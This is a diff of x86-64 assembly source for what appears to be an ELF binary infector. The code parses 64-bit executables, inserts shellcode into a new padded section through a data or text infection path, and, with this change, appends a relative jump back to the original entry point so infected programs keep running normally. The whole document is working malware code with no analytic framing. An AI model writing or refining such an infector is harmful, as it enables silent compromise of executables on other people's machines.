@@ -1,4 +1,12 @@
-;let's do this
+; _____________________
+;|      O____O     ***|
+;|     (° u °)     ** |
+;|    /--------\   /  |
+;| o--|531-m31c|--/	  |
+;|    \--------/ 	  |
+;|      N    N		  |
+;|____________________|
+
 
 global _start
 
@@ -434,7 +442,8 @@ push rdx
 	pop rdx
 	pop rcx
 retn
-%define SHELLCODE_LEN 44
+%define SHELLCODE_LEN 36 ; 29 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 31 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
@@ -1159,6 +1168,7 @@ retn
 
 ;void parse64elfsec(void *file, int wfd, unsigned long pad)
 parse64elfsec:
+	mov r12, rax; copy rax into r12 for jmp calc
 	sub rsp, 8; file copy 
 	sub rsp, 8; offset of "new sect", where we will put pad and shellcode
 	sub rsp, 8;start offset 
@@ -1208,6 +1218,8 @@ parse64elfsec:
 	loop_print_pad_end:
 	call write_shellcode
 	mov rsi, QWORD[rsp + 16]
+	call write_jmp_shellcode
+	mov rsi, QWORD[rsp + 16]
 	add rsi, QWORD[rsp + 8];point to offset end of data seg in file
 	mov rdx, r9 ; fsize
 	sub rdx, QWORD[rsp + 8]; fsize - new_sect
@@ -1221,7 +1233,7 @@ retn
 ;void write_shellcode(int wfd)
 write_shellcode:
 push rdi
-	sub rsp, SHELLCODE_LEN; buffer to read shellcode in
+	sub rsp, PURE_SHELLCODE_LEN; buffer to read shellcode in
 	;OPEN SC FILE
 	push rdi
 	mov rax, 2
@@ -1235,15 +1247,49 @@ push rdi
 	mov rdi, rax
 	mov rax, 0
 	lea rsi, [rsp+8]
-	mov rdx, SHELLCODE_LEN
+	mov rdx, PURE_SHELLCODE_LEN
 	syscall; read(sc_fd, buffer, SHELLCODE_LEN);
 	mov rax, 3
 	syscall; close(sc_fd)
 	pop rdi
 	mov rax, 1
 	mov rsi, rsp
-	mov rdx, SHELLCODE_LEN
+	mov rdx, PURE_SHELLCODE_LEN
 	syscall;write(wfd, buffer, SHELLCODE_LEN)
-	add rsp, SHELLCODE_LEN
+	add rsp, PURE_SHELLCODE_LEN
 pop rdi
-retn 	
+retn
+
+write_jmp_shellcode:
+	sub rsp, 4; rel_jmp
+
+	push rsi
+	push 0x000000e9
+	mov rax, 1
+	mov rsi, rsp
+	mov rdx, 1
+	syscall; write(wfd, "\xe9", 1); op code of jmp
+	pop rax
+	pop rsi
+	mov rbx, rdi; save rdi
+	mov rdi, rsi
+	cmp r12, 0; check if data or text infection was used
+	je wjs_text
+	call find_new_entry
+	jmp wjs_done
+	wjs_text:
+	call find_new_entry_text
+	wjs_done: ; rax now contains new_entry
+	mov DWORD[rsp], eax
+	add DWORD[rsp], SHELLCODE_LEN
+	mov rax, QWORD[rdi + 24]; old_entry
+	add DWORD[rsp], eax
+	neg DWORD[rsp]
+	lea rsi, [rsp]
+	mov rax, 1
+	mov rdx, 4
+	mov rdi, rbx
+	syscall; write(wfd, &jmp_addr, 4);
+	add rsp, 4
+
+retn
